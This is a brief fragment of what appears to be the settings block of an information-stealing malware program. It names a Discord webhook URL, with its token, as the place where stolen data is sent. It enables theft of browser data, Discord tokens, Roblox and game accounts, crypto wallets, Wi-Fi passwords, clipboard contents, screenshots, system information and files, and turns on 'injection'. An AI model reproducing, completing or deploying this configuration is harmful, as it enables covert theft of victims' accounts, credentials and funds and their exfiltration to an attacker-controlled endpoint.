...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1426929306164002818/Nv5g-5Z8yoW5hHGIPSIoLgHRR2jX2Hj8DeWcry6wIKzETvnRYI8fp81tK56xuo6KzKpH', 'ping': True, 'pingtype': 'Everyone', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': False, 'systeminfo': True, 'common_files': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'wifi': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': True, 'webcam': False, 'games': True, 'screenshot': True, 'mutex': 'hoLstZ2psnUGh5bs', 'wallets': True}
